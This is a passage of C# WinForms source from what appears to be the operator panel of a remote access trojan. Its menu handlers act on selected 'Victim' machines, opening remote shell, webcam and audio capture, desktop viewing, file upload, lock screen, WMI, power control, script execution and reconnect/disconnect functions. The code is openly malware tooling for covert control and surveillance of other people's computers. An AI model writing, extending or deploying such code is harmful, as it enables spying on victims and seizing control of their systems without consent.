            frmMultiDesktop f = new frmMultiDesktop();
            f.l_victim = list;
            f.Tag = Function.MultiDesktop;

            f.Show();
        }

        //MULTI - WEBCAM
        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            List<Victim> l_victim = new List<Victim>();
            foreach (ListViewItem item in listView1.SelectedItems)
                l_victim.Add(GetVictim(item));
            frmMultiWebcam f = new frmMultiWebcam();

            f.Show();
        }

        //MULTI - SEND FILE
        private void toolStripMenuItem16_Click(object sender, EventArgs e)
        {
            List<Victim> l_victim = new List<Victim>();
            frmMultiFile f = new frmMultiFile();
            foreach (ListViewItem item in listView1.SelectedItems)
                f.dic_uf.Add(GetVictim(item), new frmManager() { v = GetVictim(item) }.File_UploadFile);

            f.Show();
        }

        //MULTI - LOCK SCREEN
        private void toolStripMenuItem17_Click(object sender, EventArgs e)
        {
            List<Victim> l_victim = new List<Victim>();
            foreach (ListViewItem item in listView1.SelectedItems)
                l_victim.Add(GetVictim(item));
            frmMultiLockScreen f = new frmMultiLockScreen();
            f.l_victim = l_victim;

            f.Show();
        }

        private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            using (SolidBrush brush = new SolidBrush(Color.Black))
            {
                e.Graphics.FillRectangle(brush, e.Bounds);
            }

            TextRenderer.DrawText(
                e.Graphics,
                e.Header.Text,
                e.Font,
                e.Bounds,
                Color.White,
                TextFormatFlags.VerticalCenter | TextFormatFlags.Left);

            using (Pen pen = new Pen(Color.Gray))
            {
                e.Graphics.DrawRectangle(pen, e.Bounds);
            }
        }

        private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void listView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            Color backColor = e.ColumnIndex % 2 == 0 ? Color.LightYellow : Color.LightGreen;

            using (SolidBrush brush = new SolidBrush(backColor))
            {
                e.Graphics.FillRectangle(brush, e.Bounds);
            }

            e.Graphics.DrawString(e.SubItem.Text, e.Item.Font, Brushes.Black, e.Bounds);
        }

        //CHANGE COLOR
        private void toolStripMenuItem18_Click(object sender, EventArgs e)
        {
            //ColorStyle(ColorStyleMode.LightMode);
        }

        //CHANGE COLOR
        private void toolStripMenuItem19_Click(object sender, EventArgs e)
        {
            //ColorStyle(ColorStyleMode.DarkMode);
        }

        //REMOTE SHELL
        private void toolStripMenuItem20_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmShell f = new frmShell();
                f.Tag = Function.Shell;
                f.v = GetVictim(item);
                f.Text = @$"Shell\\{f.v.ID}";
                f.StartPosition = FormStartPosition.CenterScreen;

                f.Show();
            }
        }

        //CLIENT CONFIG
        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmClientConfig f = new frmClientConfig();
                f.v = GetVictim(item);
                f.Tag = Function.ClientConfig;
                f.Text = $@"ClientConfig\\{f.v.ID}";
                f.StartPosition = FormStartPosition.CenterScreen;

                f.Show();
            }
        }

        //WMI
        private void toolStripMenuItem22_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Victim v = GetVictim(item);
                frmWMI f = new frmWMI();
                f.Tag = Function.WMI;
                f.v = v;
                f.Text = $@"WMI\\{v.ID}";
                f.Show();
            }
        }

        //AUDIO
        private void toolStripMenuItem24_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmAudio f = new frmAudio();
                f.v = GetVictim(item);
                f.Text = $@"Audio\\{f.v.ID}";
                f.Tag = Function.Audio;
                f.Show();
            }
        }

        //MULTI - RUN BATCH SCRIPT
        private void toolStripMenuItem23_Click(object sender, EventArgs e)
        {
            List<Victim> lsVictim = listView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
            frmMultiRunScript f = new frmMultiRunScript();
            f.lsVictim = lsVictim;
            f.Show();
        }

        //POWER
        private void toolStripMenuItem26_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Victim v = GetVictim(item);
                frmPower f = new frmPower();
                f.StartPosition = FormStartPosition.CenterScreen;
                f.v = v;
                f.Text = $@"Computer Power\\{v.ID}";
                f.Show();
            }
        }

        //SYSTEM
        private void toolStripMenuItem25_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmSystem f = new frmSystem();
                f.v = GetVictim(item);
                f.Tag = Function.System;
                f.Text = $@"System\\{f.v.ID}";
                f.Show();
            }
        }

        //SETTING
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            frmSetting f = new frmSetting();
            f.Text = "Setting";
            f.ShowDialog();
        }

        //ABOUT
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            frmAbout f = new frmAbout();
            f.Text = "About";
            f.Show();
        }

        //Reconnect
        private void toolStripMenuItem28_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Victim v = GetVictim(item);
                v.Send(0, 1, string.Empty);
            }
        }
        //Disconnect
        private void toolStripMenuItem29_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Victim v = GetVictim(item);
                v.Send(0, 0, string.Empty);
            }
        }

        //Run Script
        private void toolStripMenuItem21_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmRunScript f = new frmRunScript();
                f.v = GetVictim(item);
                f.Text = $@"RunScript\\{f.v.ID}";
                f.Tag = Function.RunScript;

                f.Show();
            }
        }
    }
}